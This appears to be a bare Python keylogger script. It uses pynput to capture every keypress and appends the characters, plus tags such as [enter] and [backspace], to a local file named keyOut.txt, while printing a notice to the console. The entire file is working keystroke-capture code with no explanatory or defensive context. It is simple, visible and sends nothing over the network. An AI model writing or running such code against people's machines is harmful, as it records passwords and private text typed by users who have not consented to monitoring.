from pynput import keyboard

def on_press(key):
        print("keylogger running ({0})".format(key))
        try:
                with open('keyOut.txt','a') as f:
                        f.write(key.char)
        except AttributeError:
                with open('keyOut.txt','a') as f:
                        if key == key.space:
                                f.write(' ')
                        elif key == key.enter:
                                f.write('[enter]')
                        elif key == key.backspace:
                                f.write('[backspace]')
                        elif key == key.shift:
                                f.write('[shift]')
                        else:
                                f.write('?')
def on_release(key):
        pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
